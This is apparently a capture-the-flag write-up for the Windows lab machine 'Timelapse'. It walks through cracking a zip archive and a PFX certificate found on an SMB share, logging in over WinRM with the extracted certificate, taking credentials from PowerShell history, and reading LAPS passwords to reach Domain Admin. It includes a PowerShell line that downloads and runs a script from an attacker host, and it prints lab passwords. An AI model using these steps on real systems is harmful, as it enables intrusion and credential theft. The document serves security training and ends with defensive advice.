**IP Address:** `10.10.11.152`  
**OS:** Windows  
**Difficulty:** Easy  
**Tags:** #SMB, #LAPS, #PFX, #Evil-WinRM, #PasswordCracking

---

## Synopsis

Timelapse is an easy Windows machine where initial access is obtained via a **public SMB share** containing a password-protected `.zip` archive.  
Inside the archive is a `.pfx` certificate protected with another password. By cracking both passwords, the private key and SSL certificate can be extracted and used to authenticate via **WinRM over SSL**.

Post-exploitation reveals credentials stored in PowerShell history for a domain account in the `LAPS_Readers` group.  
This group can read local Administrator passwords via **LAPS (Local Administrator Password Solution)**, enabling privilege escalation to Domain Admin and complete system compromise.

---

## Skills Required

- SMB enumeration & share access
- Password cracking with `fcrackzip` and `John the Ripper`
- WinRM over SSL connections with certificates
- LAPS privilege escalation techniques

## Skills Learned

- Cracking `.zip` and `.pfx` file passwords
- Authenticating to WinRM using certificates and private keys
- Extracting credentials from PowerShell command history
- Using PowerShell modules to retrieve LAPS passwords for privilege escalation

---

## 1. Initial Enumeration

### 1.1 Connectivity Test

Check if the host is alive using ICMP:

``` bash
ping -c 1 10.10.11.152
```

![[ping.png]]

The host responds, confirming it is reachable.

---

### 1.2 Port Scanning

Identify all open TCP ports:

``` bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.152 -oG allPorts
```

![[allports.png]]

Extract open ports:

``` bash
extractPorts allPorts
```

![[extractports.png]]

---

### 1.3 Targeted Scan

Perform deeper enumeration with service and version detection:

``` bash
nmap -sCV -p53,88,135,139,389,445,464,593,636,3268,3269,5986,9389,49668,49673,49674,49695 10.10.11.152 -oN targeted
```

![[targeted.png]]

Multiple AD-related services are open, confirming the host is a **Domain Controller**.

---

## 2. SMB Enumeration

### 2.1 Identifying Domain & Hostname

``` bash
crackmapexec smb 10.10.11.152
```

![[crackmapexec.png]]

The machine name is **DC01** and the domain is **timelapse.htb**.

---

### 2.2 Listing SMB Shares (Null Session)

``` bash
smbclient -L 10.10.11.152 -N
```

![[smbclient_null.png]]

Check permissions with `smbmap`:

``` bash
smbmap -H 10.10.11.152 -u none
```

![[smbmap_none.png]]

---

### 2.3 Accessing the `Shares` Share

``` bash
smbclient //10.10.11.152/Shares -N
```

![[smbclient_shares_null.png]]

- **HelpDesk** → Contains files referencing **LAPS** (Local Administrator Password Solution).
- **Dev** → Contains `winrm_backup.zip`.

---

## 3. Obtaining Foothold

### 3.1 Inspecting the Archive

Listing contents of `winrm_backup.zip` reveals a `.pfx` file, but the ZIP is password-protected.

---

### 3.2 Cracking the ZIP Password

``` bash
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip
```

![[fcrackzip.png]]

Password recovered → extract `.pfx` file.

---

### 3.3 Attempting PFX Extraction

``` bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes
```

![[openssl_pfx_file.png]]

Requires another password.

---

### 3.4 Cracking the PFX Password

Convert `.pfx` to hash format:

``` bash
pfx2john legacyy_dev_auth.pfx > pfx.hash 
john pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![[pfx2john.png]]  


Password recovered.

---

### 3.5 Extracting Certificate and Key

``` bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out priv-key.pem -nodes 
```

![[priv_key_hash.png]]

``` bash
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out certificates.pem
```

![[certificates_hash.png]]

---

### 3.6 WinRM over SSL Access

Port 5986 is open (WinRM over SSL). Authenticate using Evil-WinRM:

``` bash
evil-winrm -i 10.10.11.152 -c certificates.pem -k priv-key.pem -S
```

![[user_flag.png]]

🏁 **User flag obtained**

---

## 4. Lateral Movement

### 4.1 Enumerating Users & Groups

Check privileges of current user and other accounts:

``` powershell
net user
whoami /priv
net user legacyy
```

![[legacyy_priv.png]]  

``` powershell
net user svc_deploy
net user TRX
```

![[users_priv.png]]

Notable accounts:

- **svc_deploy** → Member of `LAPS_Readers`
- **TRX** → Member of `Domain Admins`

---

### 4.2 Harvesting Credentials from PowerShell History

``` powershell
type AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

![[last_commands_used.png]]

Recovered credentials:

`Username: svc_deploy 
`Password: E3R$Q62^12p7PLlC%KWaxuaV`

---

### 4.3 Logging in as svc_deploy

``` bash
evil-winrm -i 10.10.11.152 -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

![[evil_winrm_svc_deploy.png]]

---

## 5. Privilege Escalation via LAPS

### 5.1 Understanding LAPS

LAPS (Local Administrator Password Solution) allows domain admins to centrally manage local admin passwords.  
Members of `LAPS_Readers` can retrieve these passwords from AD.

---

### 5.2 Uploading LAPS Retrieval Script

Official method (from AdmPwd.PS):

``` powershell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.7/Get-LAPSPasswords.ps1') Get-LAPSPasswords
```

![[LAPS_executed_in_legacyy_user.png]]

💡 **Note:** In a real engagement, `AdmPwd.PS` cmdlets like `Get-AdmPwdPassword` can be used instead:

``` powershell
Find-AdmPwdExtendedRights -Identity 'Domain Controllers' Get-AdmPwdPassword -ComputerName DC01
```

---

### 5.3 Authenticating as Domain Admin

Test retrieved password:

``` bash
evil-winrm -i 10.10.11.152 -u 'Administrator' -p 'iLZZ!2zt/)]s#@6+-#L@}Yc6' -S
```

![[root_flag.png]]

The `root.txt` flag is found under `TRX\Desktop`, accessible due to Domain Admin privileges.

🏁 **Root flag obtained**

---

# ✅ MACHINE COMPLETE

---

## Summary of Exploitation Path

1. **SMB Enumeration** → Discovered `winrm_backup.zip` in `Shares`.
2. **ZIP Cracking** → Extracted `.pfx` file.
3. **PFX Cracking** → Retrieved certificate and key.
4. **WinRM over SSL** → Logged in as `legacyy`.
5. **Credential Harvesting** → Found `svc_deploy` credentials in PowerShell history.
6. **LAPS Abuse** → Retrieved Domain Admin password.
7. **Domain Admin Access** → Retrieved root flag.    

---

## Defensive Recommendations

- Restrict SMB share permissions and remove sensitive files from public shares.
- Use strong, unique passwords for backups and certificates.
- Regularly clear PowerShell history.
- Limit membership of `LAPS_Readers` group.
- Monitor for unusual WinRM authentication using certificates.